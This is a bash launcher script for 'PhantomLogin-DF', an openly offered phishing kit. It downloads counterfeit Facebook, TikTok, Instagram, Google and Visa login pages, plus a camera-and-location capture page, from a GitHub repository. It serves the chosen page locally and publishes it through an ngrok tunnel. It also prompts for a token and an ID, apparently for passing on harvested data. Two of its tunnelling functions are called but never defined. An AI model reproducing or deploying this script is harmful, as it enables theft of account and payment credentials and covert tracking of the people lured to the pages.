#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

PAGES_DIR="pages"
REPO_URL="https://raw.githubusercontent.com/MohamedAbuAl-Saud/PhantomLogin-DF/main"

show_banner() {
    clear
    echo -e "${BLUE}██████╗ ███████╗"
    echo -e "██╔══██╗██╔════╝"
    echo -e "██║  ██║█████╗"
    echo -e "██║  ██║██╔══╝"
    echo -e "██████╔╝██"
    echo -e "╚═════╝${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "[+] Version   : 1.0"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

download_page() {
    local page_name=$1
    local page_url="${REPO_URL}/${PAGES_DIR}/${page_name}.html"
    echo -e "${GREEN}Downloading ${page_name}.html...${NC}"
    curl -s -o "${page_name}.html" "${page_url}"
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}Failed to download ${page_name}.html. Please check your internet connection.${NC}"
        exit 1
    fi
    echo -e "${GREEN}${page_name}.html downloaded successfully.${NC}"
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin-DF${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${BLUE}1. Facebook login${NC}"
    echo -e "${BLUE}2. Tik tok login${NC}"
    echo -e "${BLUE}3. Instagram login${NC}"
    echo -e "${BLUE}4. Google login${NC}"
    echo -e "${BLUE}5. Visa login${NC}"
    echo -e "${BLUE}6. camera and location${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

start_local_server() {
    echo -e "${GREEN}Starting local server...${NC}"
    python3 -m http.server 8000 &> /dev/null &
    server_pid=$!
    echo -e "${GREEN}Local server started at http://127.0.0.1:8000/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop the server.${NC}"
    trap "kill $server_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_ngrok() {
    echo -e "${GREEN}Starting ngrok...${NC}"
    ngrok http 8000 &> /dev/null &
    ngrok_pid=$!
    sleep 5
    ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$ngrok_url" ]]; then
        echo -e "${RED}Failed to start ngrok. Please make sure ngrok is installed and try again.${NC}"
        exit 1
    fi
    echo -e "${GREEN}Ngrok URL: ${ngrok_url}/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop ngrok.${NC}"
    trap "kill $ngrok_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

show_banner

echo -e "${GREEN}Enter Token:${NC}"
read token
echo -e "${GREEN}Enter ID:${NC}"
read id

show_menu

echo -e "${GREEN}Choose the page you want to phish:${NC}"
read choice

case $choice in
    1)
        page="Facebook_login"
        download_page "$page"
        ;;
    2)
        page="TikTok_login"
        download_page "$page"
        ;;
    3)
        page="Instagram_login"
        download_page "$page"
        ;;
    4)
        page="Google_login"
        download_page "$page"
        ;;
    5)
        page="Visa_login"
        download_page "$page"
        ;;
    6)
        page="CameraAndLocation_login"
        download_page "$page"
        ;;
    *)
        echo -e "${RED}Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

echo -e "${GREEN}${page} login page created as ${page}.html${NC}"

echo -e "${GREEN}Do you want to use ngrok, localhost.run, serveo.net, or localhost? (n/l/s/h):${NC}"
read server_choice

if [[ "$server_choice" == "n" ]]; then
    if ! command -v ngrok &> /dev/null; then
        echo -e "${RED}Ngrok is not installed. Please install ngrok and try again.${NC}"
        exit 1
    fi
    start_ngrok
elif [[ "$server_choice" == "l" ]]; then
    if ! command -v ssh &> /dev/null; then
        echo -e "${RED}SSH is not installed. Please install SSH and try again.${NC}"
        exit 1
    fi
    start_localhost_run
elif [[ "$server_choice" == "s" ]]; then
    if ! command -v ssh &> /dev/null; then
        echo -e "${RED}SSH is not installed. Please install SSH and try again.${NC}"
        exit 1
    fi
    start_serveo
elif [[ "$server_choice" == "h" ]]; then
    start_local_server
else
    echo -e "${RED}Invalid choice. Exiting...${NC}"
    exit 1
fi

echo -e "${GREEN}Thanks to the developer Muhammad Abu Al-Saud${NC}"
echo -e "${GREEN}The tool will keep running until you press Ctrl+C to exit.${NC}"
